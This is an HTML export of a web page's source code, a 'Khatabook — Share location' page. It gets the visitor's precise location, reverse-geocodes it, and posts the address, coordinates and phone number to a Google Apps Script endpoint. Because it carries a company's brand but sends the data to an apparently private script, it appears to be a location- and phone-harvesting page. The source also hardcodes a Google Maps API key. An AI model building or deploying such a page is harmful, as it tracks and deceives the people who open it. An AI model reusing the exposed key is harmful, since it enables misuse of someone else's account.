<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta http-equiv="Content-Style-Type" content="text/css">
  <title></title>
  <meta name="Generator" content="Cocoa HTML Writer">
  <meta name="CocoaVersion" content="2685.1">
  <style type="text/css">
    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
  </style>
</head>
<body>
<p class="p1">&lt;!doctype html&gt;</p>
<p class="p1">&lt;html lang="en"&gt;</p>
<p class="p1">&lt;head&gt;</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;meta charset="utf-8" /&gt;</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;meta name="viewport" content="width=device-width,initial-scale=1" /&gt;</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;title&gt;Khatabook — Share location&lt;/title&gt;</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;style&gt;</p>
<p class="p1"><span class="Apple-converted-space">    </span>:root{--kb-orange:#FF6A00;--kb-navy:#0B2447;--kb-muted:#6B7280;--card-bg:#FFF;--radius:10px;--shadow:0 6px 18px rgba(11,36,71,0.06);--maxw:760px}</p>
<p class="p1"><span class="Apple-converted-space">    </span>*{box-sizing:border-box} body{background:linear-gradient(180deg,#fbfbfd,#fff);font-family:Inter,Segoe UI,Roboto,Arial,sans-serif;margin:18px;color:var(--kb-navy);display:flex;justify-content:center}</p>
<p class="p1"><span class="Apple-converted-space">    </span>.card{width:100%;max-width:var(--maxw);background:var(--card-bg);border-radius:var(--radius);padding:18px;box-shadow:var(--shadow);border:1px solid rgba(11,36,71,0.04)}</p>
<p class="p1"><span class="Apple-converted-space">    </span>h1{margin:0 0 8px 0;font-size:20px;color:var(--kb-navy)} .lead{margin:0 0 14px 0;color:var(--kb-muted);font-size:14px}.center{display:flex;justify-content:center;align-items:center}</p>
<p class="p1"><span class="Apple-converted-space">    </span>.btn{background:var(--kb-orange);color:#fff;border:none;padding:10px 16px;font-weight:600;border-radius:8px;cursor:pointer;box-shadow:0 6px 12px rgba(255,106,0,0.12)} .btn-outline{background:transparent;border:1px solid rgba(11,36,71,0.08);color:var(--kb-navy);padding:9px 14px;border-radius:8px;cursor:pointer}</p>
<p class="p1"><span class="Apple-converted-space">    </span>#map{height:320px;width:100%;border-radius:10px;overflow:hidden;margin-top:12px;border:1px solid rgba(11,36,71,0.06)}</p>
<p class="p1"><span class="Apple-converted-space">    </span>.controls{margin-top:12px;display:flex;gap:10px;align-items:center}.input{flex:1;padding:10px 12px;border-radius:8px;border:1px solid rgba(11,36,71,0.08);font-size:14px}</p>
<p class="p1"><span class="Apple-converted-space">    </span>.small{font-size:13px;color:var(--kb-muted)} .loader-wrap{margin-top:12px;display:none}.loader{height:10px;background:rgba(11,36,71,0.08);border-radius:999px;overflow:hidden;position:relative}.loader .bar{height:100%;width:0%;background:linear-gradient(90deg,var(--kb-orange),#FF8C42);transition:width 400ms linear}</p>
<p class="p1"><span class="Apple-converted-space">    </span>.status{margin-top:12px;font-weight:600;color:var(--kb-navy)} .hidden{display:none}.success{display:flex;gap:8px;align-items:center;color:#0f7a3a;font-weight:700;margin-top:12px}</p>
<p class="p1"><span class="Apple-converted-space">    </span>@media(max-width:420px){.controls{flex-direction:column;align-items:stretch}}</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;/style&gt;</p>
<p class="p1">&lt;/head&gt;</p>
<p class="p1">&lt;body&gt;</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;div class="card" role="main" aria-labelledby="title"&gt;</p>
<p class="p1"><span class="Apple-converted-space">    </span>&lt;h1 id="title"&gt;Share your location with Khatabook&lt;/h1&gt;</p>
<p class="p1"><span class="Apple-converted-space">    </span>&lt;p class="lead"&gt;Tap the button below to fetch your current location. You can edit the number if needed before confirming.&lt;/p&gt;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>&lt;div id="initialArea" class="center" style="padding:18px 0;"&gt;</p>
<p class="p1"><span class="Apple-converted-space">      </span>&lt;button id="shareBtn" class="btn"&gt;Share location&lt;/button&gt;</p>
<p class="p1"><span class="Apple-converted-space">    </span>&lt;/div&gt;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>&lt;div id="afterShare" class="hidden"&gt;</p>
<p class="p1"><span class="Apple-converted-space">      </span>&lt;div id="map"&gt;&lt;/div&gt;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>&lt;div class="controls" style="margin-top:12px;"&gt;</p>
<p class="p1"><span class="Apple-converted-space">        </span>&lt;input id="phone" class="input" type="text" inputmode="tel" placeholder="Phone number" /&gt;</p>
<p class="p1"><span class="Apple-converted-space">        </span>&lt;button id="confirmBtn" class="btn-outline"&gt;Confirm&lt;/button&gt;</p>
<p class="p1"><span class="Apple-converted-space">      </span>&lt;/div&gt;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>&lt;input type="hidden" id="user_id" /&gt;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>&lt;div class="loader-wrap" id="loaderWrap"&gt;</p>
<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="small"&gt;Processing — please wait&lt;/div&gt;</p>
<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="loader" aria-hidden="true" style="margin-top:8px;"&gt;</p>
<p class="p1"><span class="Apple-converted-space">          </span>&lt;div class="bar" id="loaderBar"&gt;&lt;/div&gt;</p>
<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
<p class="p1"><span class="Apple-converted-space">      </span>&lt;/div&gt;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>&lt;div id="statusText" class="status"&gt;&lt;/div&gt;</p>
<p class="p1"><span class="Apple-converted-space">    </span>&lt;/div&gt;</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;/div&gt;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;script&gt;</p>
<p class="p1"><span class="Apple-converted-space">    </span>// config (your plugged values)</p>
<p class="p1"><span class="Apple-converted-space">    </span>const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbxBPqRZLmyIWhOxONIrH-8Ro5LgKlHvzchDEyFOkdp4SieysmFKfksHzqu05ROz9VbD/exec';</p>
<p class="p1"><span class="Apple-converted-space">    </span>const MAPS_API_KEY = 'AIzaSyAj3xroieTPwJcZbeXHGOZm6B-pntI3yuA';</p>
<p class="p1"><span class="Apple-converted-space">    </span>const DEFAULT_PHONE = '+91-99999-99999';</p>
<p class="p1"><span class="Apple-converted-space">    </span>const DEFAULT_USER_ID = 'default_user_12345';</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>// UI refs</p>
<p class="p1"><span class="Apple-converted-space">    </span>const shareBtn = document.getElementById('shareBtn');</p>
<p class="p1"><span class="Apple-converted-space">    </span>const initialArea = document.getElementById('initialArea');</p>
<p class="p1"><span class="Apple-converted-space">    </span>const afterShare = document.getElementById('afterShare');</p>
<p class="p1"><span class="Apple-converted-space">    </span>const phoneInput = document.getElementById('phone');</p>
<p class="p1"><span class="Apple-converted-space">    </span>const confirmBtn = document.getElementById('confirmBtn');</p>
<p class="p1"><span class="Apple-converted-space">    </span>const userIdField = document.getElementById('user_id');</p>
<p class="p1"><span class="Apple-converted-space">    </span>const loaderWrap = document.getElementById('loaderWrap');</p>
<p class="p1"><span class="Apple-converted-space">    </span>const loaderBar = document.getElementById('loaderBar');</p>
<p class="p1"><span class="Apple-converted-space">    </span>const statusText = document.getElementById('statusText');</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>phoneInput.value = DEFAULT_PHONE;</p>
<p class="p1"><span class="Apple-converted-space">    </span>userIdField.value = DEFAULT_USER_ID;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>let map, marker, geocoder;</p>
<p class="p1"><span class="Apple-converted-space">    </span>// store the last address string</p>
<p class="p1"><span class="Apple-converted-space">    </span>let currentAddress = '';</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>function initMap() {</p>
<p class="p1"><span class="Apple-converted-space">      </span>const india = { lat: 20.5937, lng: 78.9629 };</p>
<p class="p1"><span class="Apple-converted-space">      </span>map = new google.maps.Map(document.getElementById('map'), { center: india, zoom: 5, disableDefaultUI: true });</p>
<p class="p1"><span class="Apple-converted-space">      </span>marker = new google.maps.Marker({ map, draggable: false });</p>
<p class="p1"><span class="Apple-converted-space">      </span>geocoder = new google.maps.Geocoder();</p>
<p class="p1"><span class="Apple-converted-space">    </span>}</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>shareBtn.addEventListener('click', async () =&gt; {</p>
<p class="p1"><span class="Apple-converted-space">      </span>initialArea.classList.add('hidden');</p>
<p class="p1"><span class="Apple-converted-space">      </span>afterShare.classList.remove('hidden');</p>
<p class="p1"><span class="Apple-converted-space">      </span>statusText.textContent = 'Fetching location…';</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>if (!window.google || !window.google.maps) await waitForMaps(5000);</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>if (!navigator.geolocation) {</p>
<p class="p1"><span class="Apple-converted-space">        </span>statusText.textContent = 'Geolocation not supported';</p>
<p class="p1"><span class="Apple-converted-space">        </span>return;</p>
<p class="p1"><span class="Apple-converted-space">      </span>}</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>navigator.geolocation.getCurrentPosition(async (pos) =&gt; {</p>
<p class="p1"><span class="Apple-converted-space">        </span>const lat = pos.coords.latitude;</p>
<p class="p1"><span class="Apple-converted-space">        </span>const lng = pos.coords.longitude;</p>
<p class="p1"><span class="Apple-converted-space">        </span>setPosition(lat, lng);</p>
<p class="p1"><span class="Apple-converted-space">        </span>// reverse-geocode and populate currentAddress</p>
<p class="p1"><span class="Apple-converted-space">        </span>try {</p>
<p class="p1"><span class="Apple-converted-space">          </span>geocoder.geocode({ location: { lat, lng } }, (results, status) =&gt; {</p>
<p class="p1"><span class="Apple-converted-space">            </span>if (status === 'OK' &amp;&amp; results &amp;&amp; results.length) {</p>
<p class="p1"><span class="Apple-converted-space">              </span>// prefer formatted_address</p>
<p class="p1"><span class="Apple-converted-space">              </span>const formatted = results[0].formatted_address || '';</p>
<p class="p1"><span class="Apple-converted-space">              </span>// check plus code if present (some results include plus_code)</p>
<p class="p1"><span class="Apple-converted-space">              </span>let plus = '';</p>
<p class="p1"><span class="Apple-converted-space">              </span>if (results[0].plus_code &amp;&amp; results[0].plus_code.compound_code) plus = results[0].plus_code.compound_code;</p>
<p class="p1"><span class="Apple-converted-space">              </span>// create a combined readable string (prefer formatted, but include plus code if it's useful)</p>
<p class="p1"><span class="Apple-converted-space">              </span>if (formatted) {</p>
<p class="p1"><span class="Apple-converted-space">                </span>currentAddress = formatted + (plus &amp;&amp; formatted.indexOf(plus) === -1 ? (' — ' + plus) : '');</p>
<p class="p1"><span class="Apple-converted-space">              </span>} else if (plus) {</p>
<p class="p1"><span class="Apple-converted-space">                </span>currentAddress = plus;</p>
<p class="p1"><span class="Apple-converted-space">              </span>} else {</p>
<p class="p1"><span class="Apple-converted-space">                </span>currentAddress = 'Lat:' + lat.toFixed(6) + ',Lng:' + lng.toFixed(6);</p>
<p class="p1"><span class="Apple-converted-space">              </span>}</p>
<p class="p1"><span class="Apple-converted-space">              </span>// show to user</p>
<p class="p1"><span class="Apple-converted-space">              </span>statusText.textContent = 'Location: ' + currentAddress;</p>
<p class="p1"><span class="Apple-converted-space">            </span>} else {</p>
<p class="p1"><span class="Apple-converted-space">              </span>// fallback to plus_code or coords</p>
<p class="p1"><span class="Apple-converted-space">              </span>if (results &amp;&amp; results.length &amp;&amp; results[0] &amp;&amp; results[0].plus_code &amp;&amp; results[0].plus_code.compound_code) {</p>
<p class="p1"><span class="Apple-converted-space">                </span>currentAddress = results[0].plus_code.compound_code;</p>
<p class="p1"><span class="Apple-converted-space">              </span>} else {</p>
<p class="p1"><span class="Apple-converted-space">                </span>currentAddress = 'Lat:' + lat.toFixed(6) + ',Lng:' + lng.toFixed(6);</p>
<p class="p1"><span class="Apple-converted-space">              </span>}</p>
<p class="p1"><span class="Apple-converted-space">              </span>statusText.textContent = 'Location: ' + currentAddress;</p>
<p class="p1"><span class="Apple-converted-space">            </span>}</p>
<p class="p1"><span class="Apple-converted-space">          </span>});</p>
<p class="p1"><span class="Apple-converted-space">        </span>} catch (e) {</p>
<p class="p1"><span class="Apple-converted-space">          </span>currentAddress = 'Lat:' + lat.toFixed(6) + ',Lng:' + lng.toFixed(6);</p>
<p class="p1"><span class="Apple-converted-space">          </span>statusText.textContent = 'Location: ' + currentAddress;</p>
<p class="p1"><span class="Apple-converted-space">        </span>}</p>
<p class="p1"><span class="Apple-converted-space">      </span>}, (err) =&gt; {</p>
<p class="p1"><span class="Apple-converted-space">        </span>statusText.textContent = 'Error getting location: ' + (err &amp;&amp; err.message ? err.message : 'unknown');</p>
<p class="p1"><span class="Apple-converted-space">      </span>}, { enableHighAccuracy: true, timeout: 12000 });</p>
<p class="p1"><span class="Apple-converted-space">    </span>});</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>confirmBtn.addEventListener('click', async () =&gt; {</p>
<p class="p1"><span class="Apple-converted-space">      </span>const latlngStr = marker &amp;&amp; marker.getPosition ? `${marker.getPosition().lat()},${marker.getPosition().lng()}` : '';</p>
<p class="p1"><span class="Apple-converted-space">      </span>if (!latlngStr) { statusText.textContent = 'No location selected'; return; }</p>
<p class="p1"><span class="Apple-converted-space">      </span>const [lat, lng] = latlngStr.split(',');</p>
<p class="p1"><span class="Apple-converted-space">      </span>const phone = (phoneInput.value || DEFAULT_PHONE).trim();</p>
<p class="p1"><span class="Apple-converted-space">      </span>const user_id = userIdField.value || DEFAULT_USER_ID;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>loaderWrap.style.display = 'block';</p>
<p class="p1"><span class="Apple-converted-space">      </span>statusText.textContent = 'Sending location…';</p>
<p class="p1"><span class="Apple-converted-space">      </span>animateLoader();</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>// send address (currentAddress) along with lat/lng</p>
<p class="p1"><span class="Apple-converted-space">      </span>const params = new URLSearchParams();</p>
<p class="p1"><span class="Apple-converted-space">      </span>params.append('address', currentAddress || '');</p>
<p class="p1"><span class="Apple-converted-space">      </span>params.append('lat', lat);</p>
<p class="p1"><span class="Apple-converted-space">      </span>params.append('lng', lng);</p>
<p class="p1"><span class="Apple-converted-space">      </span>params.append('timestamp', new Date().toISOString());</p>
<p class="p1"><span class="Apple-converted-space">      </span>params.append('phone', phone);</p>
<p class="p1"><span class="Apple-converted-space">      </span>params.append('user_id', user_id);</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">      </span>try {</p>
<p class="p1"><span class="Apple-converted-space">        </span>const res = await fetch(WEB_APP_URL, {</p>
<p class="p1"><span class="Apple-converted-space">          </span>method: 'POST',</p>
<p class="p1"><span class="Apple-converted-space">          </span>headers: { 'Content-Type': 'application/x-www-form-urlencoded' },</p>
<p class="p1"><span class="Apple-converted-space">          </span>body: params.toString()</p>
<p class="p1"><span class="Apple-converted-space">        </span>});</p>
<p class="p1"><span class="Apple-converted-space">        </span>const text = await res.text();</p>
<p class="p1"><span class="Apple-converted-space">        </span>// stop loader and show result</p>
<p class="p1"><span class="Apple-converted-space">        </span>stopLoader();</p>
<p class="p1"><span class="Apple-converted-space">        </span>try {</p>
<p class="p1"><span class="Apple-converted-space">          </span>const json = JSON.parse(text || '{}');</p>
<p class="p1"><span class="Apple-converted-space">          </span>if (json.status === 'success' || json.status === 'ok') {</p>
<p class="p1"><span class="Apple-converted-space">            </span>statusText.textContent = 'Location received';</p>
<p class="p1"><span class="Apple-converted-space">            </span>showSuccess('Location received ✅');</p>
<p class="p1"><span class="Apple-converted-space">          </span>} else {</p>
<p class="p1"><span class="Apple-converted-space">            </span>statusText.textContent = 'Server response: ' + text;</p>
<p class="p1"><span class="Apple-converted-space">          </span>}</p>
<p class="p1"><span class="Apple-converted-space">        </span>} catch(e) {</p>
<p class="p1"><span class="Apple-converted-space">          </span>statusText.textContent = 'Server response: ' + text;</p>
<p class="p1"><span class="Apple-converted-space">        </span>}</p>
<p class="p1"><span class="Apple-converted-space">      </span>} catch (err) {</p>
<p class="p1"><span class="Apple-converted-space">        </span>stopLoader();</p>
<p class="p1"><span class="Apple-converted-space">        </span>statusText.textContent = 'Network error: ' + err.message;</p>
<p class="p1"><span class="Apple-converted-space">      </span>}</p>
<p class="p1"><span class="Apple-converted-space">    </span>});</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>function setPosition(lat, lng) {</p>
<p class="p1"><span class="Apple-converted-space">      </span>if (!map) { setTimeout(()=&gt;setPosition(lat,lng), 200); return; }</p>
<p class="p1"><span class="Apple-converted-space">      </span>map.setCenter({ lat: parseFloat(lat), lng: parseFloat(lng) });</p>
<p class="p1"><span class="Apple-converted-space">      </span>map.setZoom(16);</p>
<p class="p1"><span class="Apple-converted-space">      </span>marker.setPosition({ lat: parseFloat(lat), lng: parseFloat(lng) });</p>
<p class="p1"><span class="Apple-converted-space">    </span>}</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>let loaderInterval = null;</p>
<p class="p1"><span class="Apple-converted-space">    </span>function animateLoader(){ let pct=0; loaderBar.style.width='0%'; loaderInterval=setInterval(()=&gt;{ pct+=Math.random()*18; if(pct&gt;=98)pct=98; loaderBar.style.width=pct+'%'; },350); }</p>
<p class="p1"><span class="Apple-converted-space">    </span>function stopLoader(){ clearInterval(loaderInterval); loaderInterval=null; loaderBar.style.width='100%'; setTimeout(()=&gt;{ loaderWrap.style.display='none'; loaderBar.style.width='0%'; },700); }</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>function showSuccess(msg){</p>
<p class="p1"><span class="Apple-converted-space">      </span>const s = document.createElement('div'); s.className='success';</p>
<p class="p1"><span class="Apple-converted-space">      </span>s.innerHTML = '&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none" style="flex:0 0 18px;"&gt;&lt;path d="M20 6L9 17l-5-5" stroke="#0f7a3a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"&gt;&lt;/path&gt;&lt;/svg&gt;'+msg;</p>
<p class="p1"><span class="Apple-converted-space">      </span>const after = document.getElementById('afterShare'); if(after) after.appendChild(s);</p>
<p class="p1"><span class="Apple-converted-space">    </span>}</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">    </span>function waitForMaps(timeout=5000){ return new Promise((resolve,reject)=&gt;{ const start=Date.now(); (function check(){ if(window.google&amp;&amp;window.google.maps){ return resolve(); } if(Date.now()-start&gt;timeout) return reject(); setTimeout(check,200); })(); }); }</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;/script&gt;</p>
<p class="p2"><br></p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;!-- Maps JS (API key plugged) --&gt;</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;script async defer</p>
<p class="p1"><span class="Apple-converted-space">    </span>src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAj3xroieTPwJcZbeXHGOZm6B-pntI3yuA&amp;libraries=places&amp;callback=initMap"&gt;</p>
<p class="p1"><span class="Apple-converted-space">  </span>&lt;/script&gt;</p>
<p class="p1">&lt;/body&gt;</p>
<p class="p1">&lt;/html&gt;</p>
</body>
</html>
